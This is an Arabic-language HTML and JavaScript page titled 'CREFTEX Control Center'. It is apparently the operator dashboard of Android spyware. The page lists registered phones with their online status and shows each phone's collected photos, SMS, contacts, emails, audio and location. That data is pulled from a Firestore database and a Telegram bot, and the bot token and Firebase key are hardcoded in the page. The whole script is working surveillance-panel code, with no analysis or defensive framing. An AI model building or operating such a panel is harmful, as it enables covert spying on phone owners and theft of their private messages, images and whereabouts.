<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1180, initial-scale=1.0">
    <title>CREFTEX — Control Center</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0f1a;
            --card: #131e2f;
            --card-2: #1a2840;
            --border: #22344d;
            --text: #e8eef8;
            --dim: #7c8db0;
            --accent: #3b82f6;
            --cyan: #22d3ee;
            --green: #10b981;
            --purple: #8b5cf6;
            --red: #ef4444;
            --yellow: #f59e0b;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body {
            background: linear-gradient(180deg, #0a0f1a, #050810);
            color: var(--text);
            min-height: 100vh;
            padding: 20px;
        }
        .app { width: 1180px; max-width: 100%; margin: 0 auto; }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 24px;
            background: rgba(19, 30, 47, 0.8);
            border: 1px solid var(--border);
            border-radius: 20px;
            margin-bottom: 20px;
        }
        .brand { display: flex; align-items: center; gap: 14px; }
        .brand-logo {
            width: 50px; height: 50px;
            border-radius: 14px;
            background: linear-gradient(135deg, var(--accent), var(--cyan));
            display: flex; align-items: center; justify-content: center;
            font-size: 24px;
        }
        .brand h1 {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #60a5fa, #22d3ee);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .brand p { font-size: 12px; color: var(--dim); }

        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 14px;
            margin-bottom: 20px;
        }
        .stat {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 18px;
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .stat .icon {
            width: 46px; height: 46px;
            border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 22px;
            background: rgba(59, 130, 246, 0.15);
        }
        .stat .info { flex: 1; }
        .stat .num {
            font-size: 28px; font-weight: 800;
            color: var(--cyan);
        }
        .stat .lbl { font-size: 12px; color: var(--dim); }

        /* Devices List */
        .section-title {
            display: flex; align-items: center; gap: 10px;
            font-size: 18px; font-weight: 700;
            margin: 24px 0 14px;
        }
        .section-title .count {
            background: var(--accent);
            color: #fff;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 12px;
        }
        .devices {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 14px;
            margin-bottom: 24px;
        }
        .device {
            background: linear-gradient(160deg, #142231 0%, #131e30 60%, #1b1830 100%);
            border: 2px solid transparent;
            background-clip: padding-box;
            border-radius: 20px;
            padding: 18px;
            cursor: pointer;
            position: relative;
            transition: all 0.2s;
        }
        .device::before {
            content: ""; position: absolute; inset: -2px;
            border-radius: 22px; z-index: -1;
            background: linear-gradient(120deg, #00afff, #2e7fe8 40%, #8b3dff 75%, #b33cff);
        }
        .device.inactive::before {
            background: linear-gradient(120deg, #5a2020, #8b2d2d 40%, #b33c3c 75%, #d84c4c);
        }
        .device:hover { transform: translateY(-3px); }
        .device .status {
            position: absolute; top: 12px; left: 12px;
            width: 10px; height: 10px;
            border-radius: 50%;
            background: var(--green);
            box-shadow: 0 0 12px rgba(16, 185, 129, 0.9);
        }
        .device.inactive .status {
            background: var(--red);
            box-shadow: 0 0 12px rgba(239, 68, 68, 0.9);
        }
        .device .name {
            font-size: 17px; font-weight: 800;
            margin-bottom: 8px;
            direction: ltr;
            text-align: left;
        }
        .device .meta {
            font-size: 12px; color: var(--dim);
            direction: ltr;
            text-align: left;
            font-family: 'Courier New', monospace;
        }

        /* Device Detail Panel */
        .detail {
            display: none;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 20px;
        }
        .detail.open { display: block; }
        .detail-head {
            display: flex; justify-content: space-between; align-items: center;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }
        .detail-title { display: flex; align-items: center; gap: 14px; }
        .detail-title .avatar {
            width: 60px; height: 60px;
            border-radius: 16px;
            background: linear-gradient(135deg, var(--accent), var(--cyan));
            display: flex; align-items: center; justify-content: center;
            font-size: 28px;
        }
        .detail-title h2 { font-size: 20px; }
        .detail-title p { font-size: 12px; color: var(--dim); direction: ltr; }
        .close-btn {
            padding: 8px 16px;
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.4);
            color: var(--red);
            border-radius: 10px;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
        }

        /* Tabs */
        .tabs {
            display: flex; gap: 8px;
            margin-bottom: 18px;
            flex-wrap: wrap;
        }
        .tab {
            padding: 10px 18px;
            background: var(--card-2);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: var(--dim);
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
            display: flex; align-items: center; gap: 6px;
        }
        .tab.on {
            background: linear-gradient(135deg, var(--accent), #2563eb);
            color: #fff;
            border-color: var(--accent);
        }

        /* Tab Content */
        .tab-content {
            display: none;
        }
        .tab-content.on { display: block; }

        /* Gallery (Images Grid) */
        .gallery {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
        }
        .gallery img {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 12px;
            cursor: pointer;
            border: 1px solid var(--border);
            transition: transform 0.15s;
        }
        .gallery img:hover { transform: scale(1.03); }

        /* List (for SMS, contacts, etc.) */
        .list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            max-height: 600px;
            overflow-y: auto;
        }
        .list-item {
            background: var(--card-2);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 14px;
            font-size: 14px;
        }
        .list-item .title {
            font-weight: 700;
            color: var(--cyan);
            margin-bottom: 6px;
        }
        .list-item .text {
            color: var(--text);
            line-height: 1.6;
            font-size: 13px;
        }
        .list-item .meta {
            font-size: 11px;
            color: var(--dim);
            margin-top: 6px;
        }

        .empty {
            text-align: center;
            padding: 60px 20px;
            color: var(--dim);
        }
        .empty .icon { font-size: 60px; margin-bottom: 12px; opacity: 0.4; }

        /* Modal for full image */
        .modal {
            position: fixed; inset: 0;
            background: rgba(0, 0, 0, 0.95);
            display: none;
            align-items: center; justify-content: center;
            z-index: 9999;
            padding: 30px;
        }
        .modal.show { display: flex; }
        .modal img { max-width: 100%; max-height: 90vh; border-radius: 16px; }
        .modal-close {
            position: absolute; top: 20px; right: 20px;
            width: 44px; height: 44px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 24px; left: 50%;
            transform: translateX(-50%) translateY(100px);
            padding: 14px 24px;
            border-radius: 14px;
            background: rgba(19, 30, 47, 0.95);
            border: 1px solid var(--border);
            font-size: 14px;
            font-weight: 700;
            transition: transform 0.3s;
            z-index: 9999;
        }
        .toast.show { transform: translateX(-50%) translateY(0); }
        .toast.ok { border-color: var(--green); color: var(--green); }
        .toast.err { border-color: var(--red); color: var(--red); }
    </style>
</head>
<body>
<div class="app">
    <!-- Header -->
    <div class="header">
        <div class="brand">
            <div class="brand-logo">⚡</div>
            <div>
                <h1>CREFTEX</h1>
                <p>CONTROL CENTER</p>
            </div>
        </div>
        <button class="close-btn" onclick="loadAll()">🔄 تحديث</button>
    </div>

    <!-- Stats -->
    <div class="stats">
        <div class="stat">
            <div class="icon">📱</div>
            <div class="info">
                <div class="num" id="statDevices">0</div>
                <div class="lbl">الأجهزة</div>
            </div>
        </div>
        <div class="stat">
            <div class="icon" style="background: rgba(34, 211, 238, 0.15);">📸</div>
            <div class="info">
                <div class="num" id="statPhotos" style="color: var(--cyan);">0</div>
                <div class="lbl">الصور</div>
            </div>
        </div>
        <div class="stat">
            <div class="icon" style="background: rgba(139, 92, 246, 0.15);">💬</div>
            <div class="info">
                <div class="num" id="statMessages" style="color: var(--purple);">0</div>
                <div class="lbl">الرسائل</div>
            </div>
        </div>
    </div>

    <!-- Devices List -->
    <div class="section-title">
        <span>📱 الأجهزة</span>
        <span class="count" id="deviceCount">0</span>
    </div>
    <div class="devices" id="devicesList">
        <div class="empty" style="grid-column: 1/-1;">
            <div class="icon">📭</div>
            <div>لا أجهزة مسجّلة بعد</div>
        </div>
    </div>

    <!-- Device Detail -->
    <div class="detail" id="detail">
        <div class="detail-head">
            <div class="detail-title">
                <div class="avatar" id="detailAvatar">📱</div>
                <div>
                    <h2 id="detailName">—</h2>
                    <p id="detailId">—</p>
                </div>
            </div>
            <button class="close-btn" onclick="closeDetail()">✕ إغلاق</button>
        </div>

        <div class="tabs">
            <button class="tab on" onclick="switchTab(this, 'photos')">📸 الصور</button>
            <button class="tab" onclick="switchTab(this, 'sms')">📩 SMS</button>
            <button class="tab" onclick="switchTab(this, 'contacts')">👥 جهات الاتصال</button>
            <button class="tab" onclick="switchTab(this, 'emails')">📧 الإيميلات</button>
            <button class="tab" onclick="switchTab(this, 'music')">🎵 الموسيقى</button>
            <button class="tab" onclick="switchTab(this, 'location')">📍 الموقع</button>
        </div>

        <div class="tab-content on" id="tab-photos">
            <div class="gallery" id="photosGrid"></div>
        </div>

        <div class="tab-content" id="tab-sms">
            <div class="list" id="smsList"></div>
        </div>

        <div class="tab-content" id="tab-contacts">
            <div class="list" id="contactsList"></div>
        </div>

        <div class="tab-content" id="tab-emails">
            <div class="list" id="emailsList"></div>
        </div>

        <div class="tab-content" id="tab-music">
            <div class="list" id="musicList"></div>
        </div>

        <div class="tab-content" id="tab-location">
            <div class="list" id="locationList"></div>
        </div>
    </div>
</div>

<!-- Image Modal -->
<div class="modal" id="imgModal" onclick="closeModal()">
    <button class="modal-close">×</button>
    <img id="modalImg" src="" alt="">
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
// ═══════════════════════════════════════════
//  الإعدادات
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";

const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
const FS_DEVICES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`;
const FS_MESSAGES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;

let currentDevice = null;
let allMessages = [];
let deviceNames = JSON.parse(localStorage.getItem('device_names') || '{}');

// ═══════════════════════════════════════════
//  Toast
// ═══════════════════════════════════════════
function toast(msg, type='ok') {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast show ' + type;
    clearTimeout(window.__tt);
    window.__tt = setTimeout(() => t.classList.remove('show'), 2500);
}

// ═══════════════════════════════════════════
//  Load Devices
// ═══════════════════════════════════════════
async function loadDevices() {
    try {
        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
        const data = await res.json();
        const docs = data.documents || [];

        const list = document.getElementById('devicesList');

        if (docs.length === 0) {
            list.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
                <div class="icon">📭</div>
                <div>لا أجهزة مسجّلة بعد</div>
            </div>`;
            document.getElementById('statDevices').textContent = '0';
            document.getElementById('deviceCount').textContent = '0';
            return;
        }

        const devices = docs.map(d => {
            const f = d.fields || {};
            const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
            return {
                id: f.id?.stringValue || '',
                brand: f.brand?.stringValue || '',
                manufacturer: f.manufacturer?.stringValue || '',
                model: f.model?.stringValue || '',
                android: f.android?.stringValue || '',
                lastSeen: lastSeen,
                isActive: (Date.now() - lastSeen) < 10 * 60 * 1000
            };
        }).sort((a, b) => b.lastSeen - a.lastSeen);

        document.getElementById('statDevices').textContent = devices.length;
        document.getElementById('deviceCount').textContent = devices.length;

        list.innerHTML = '';
        for (const d of devices) list.appendChild(buildDeviceCard(d));
    } catch (e) {
        console.error(e);
    }
}

function buildDeviceCard(d) {
    const card = document.createElement('div');
    card.className = 'device' + (d.isActive ? '' : ' inactive');
    card.onclick = () => openDevice(d);

    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;

    card.innerHTML = `
        <div class="status"></div>
        <div class="name">${escapeHtml(customName)}</div>
        <div class="meta">Android ${escapeHtml(d.android)}</div>
        <div class="meta">${escapeHtml(d.id)}</div>
    `;
    return card;
}

// ═══════════════════════════════════════════
//  Open Device
// ═══════════════════════════════════════════
async function openDevice(d) {
    currentDevice = d;
    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;

    document.getElementById('detailName').textContent = customName;
    document.getElementById('detailId').textContent = d.id;
    document.getElementById('detail').classList.add('open');
    document.getElementById('detail').scrollIntoView({ behavior: 'smooth' });

    // Load messages
    await loadMessages();

    // Render photos (default tab)
    renderPhotos();
}

function closeDetail() {
    document.getElementById('detail').classList.remove('open');
    currentDevice = null;
}

// ═══════════════════════════════════════════
//  Tabs
// ═══════════════════════════════════════════
function switchTab(el, tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
    el.classList.add('on');

    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('on'));
    document.getElementById('tab-' + tabName).classList.add('on');

    // Re-render specific tab
    if (tabName === 'photos') renderPhotos();
    else if (tabName === 'sms') renderSms();
    else if (tabName === 'contacts') renderContacts();
    else if (tabName === 'emails') renderEmails();
    else if (tabName === 'music') renderMusic();
    else if (tabName === 'location') renderLocation();
}

// ═══════════════════════════════════════════
//  Load Messages
// ═══════════════════════════════════════════
async function loadMessages() {
    try {
        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`);
        const data = await res.json();
        allMessages = (data.documents || []).map(d => {
            const f = d.fields || {};
            return {
                type: f.type?.stringValue || 'text',
                text: f.text?.stringValue || '',
                file_id: f.file_id?.stringValue || '',
                caption: f.caption?.stringValue || '',
                time_ms: parseInt(f.time_ms?.integerValue || '0'),
                from_user: f.from_user?.booleanValue || false
            };
        }).sort((a, b) => a.time_ms - b.time_ms);

        document.getElementById('statMessages').textContent = allMessages.length;
        document.getElementById('statPhotos').textContent = allMessages.filter(m => m.type === 'photo').length;
    } catch (e) {
        console.error(e);
    }
}

// ═══════════════════════════════════════════
//  Render Photos (Gallery Grid)
// ═══════════════════════════════════════════
function renderPhotos() {
    const grid = document.getElementById('photosGrid');
    const photos = allMessages.filter(m => m.type === 'photo' && m.file_id);

    if (photos.length === 0) {
        grid.innerHTML = `<div class="empty" style="grid-column: 1/-1;">
            <div class="icon">📭</div>
            <div>لا توجد صور</div>
        </div>`;
        return;
    }

    grid.innerHTML = '';
    for (const p of photos) {
        const img = document.createElement('img');
        img.dataset.file = p.file_id;
        img.alt = p.caption || 'photo';
        img.onclick = () => openModal(img.src);
        grid.appendChild(img);
        loadMedia(p.file_id, img);
    }
}

// ═══════════════════════════════════════════
//  Render SMS
// ═══════════════════════════════════════════
function renderSms() {
    const list = document.getElementById('smsList');
    const sms = allMessages.filter(m => m.type === 'sms' || (m.text && m.text.includes('📩 SMS من')));

    if (sms.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد رسائل SMS</div></div>`;
        return;
    }

    list.innerHTML = '';
    for (const s of sms) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="title">📩 رسالة</div>
            <div class="text">${escapeHtml(s.text || s.caption)}</div>
            <div class="meta">${new Date(s.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

// ═══════════════════════════════════════════
//  Render Contacts
// ═══════════════════════════════════════════
function renderContacts() {
    const list = document.getElementById('contactsList');
    const contacts = allMessages.filter(m => m.text && m.text.includes('👥'));

    if (contacts.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد جهات اتصال</div></div>`;
        return;
    }

    list.innerHTML = '';
    for (const c of contacts) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(c.text)}</div>
            <div class="meta">${new Date(c.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

function renderEmails() {
    const list = document.getElementById('emailsList');
    const emails = allMessages.filter(m => m.text && m.text.includes('📧'));

    if (emails.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد إيميلات</div></div>`;
        return;
    }

    list.innerHTML = '';
    for (const e of emails) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(e.text)}</div>
            <div class="meta">${new Date(e.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

function renderMusic() {
    const list = document.getElementById('musicList');
    const music = allMessages.filter(m => m.type === 'audio');

    if (music.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد موسيقى</div></div>`;
        return;
    }

    list.innerHTML = '';
    for (const m of music) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="title">🎵 مقطع صوتي</div>
            <audio controls data-file="${escapeAttr(m.file_id)}" style="width:100%;margin-top:8px"></audio>
            <div class="meta">${new Date(m.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
        const audio = div.querySelector('audio');
        loadMedia(m.file_id, audio);
    }
}

function renderLocation() {
    const list = document.getElementById('locationList');
    const locations = allMessages.filter(m => m.text && m.text.includes('📍'));

    if (locations.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا يوجد موقع</div></div>`;
        return;
    }

    list.innerHTML = '';
    for (const l of locations.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(l.text).replace(/\n/g, '<br>')}</div>
            <div class="meta">${new Date(l.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

// ═══════════════════════════════════════════
//  Media Loader
// ═══════════════════════════════════════════
async function loadMedia(fileId, el) {
    try {
        const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
        const data = await res.json();
        if (data.ok && data.result.file_path) {
            el.src = `${TG_FILE}/${data.result.file_path}`;
        }
    } catch (e) {}
}

// ═══════════════════════════════════════════
//  Modal
// ═══════════════════════════════════════════
function openModal(src) {
    document.getElementById('modalImg').src = src;
    document.getElementById('imgModal').classList.add('show');
}
function closeModal() {
    document.getElementById('imgModal').classList.remove('show');
}

// ═══════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════
function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function escapeAttr(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

async function loadAll() {
    toast('جاري التحديث...');
    await loadDevices();
    if (currentDevice) await loadMessages();
    toast('✅ تم التحديث', 'ok');
}

// Start
loadDevices();
setInterval(loadDevices, 30000);
</script>
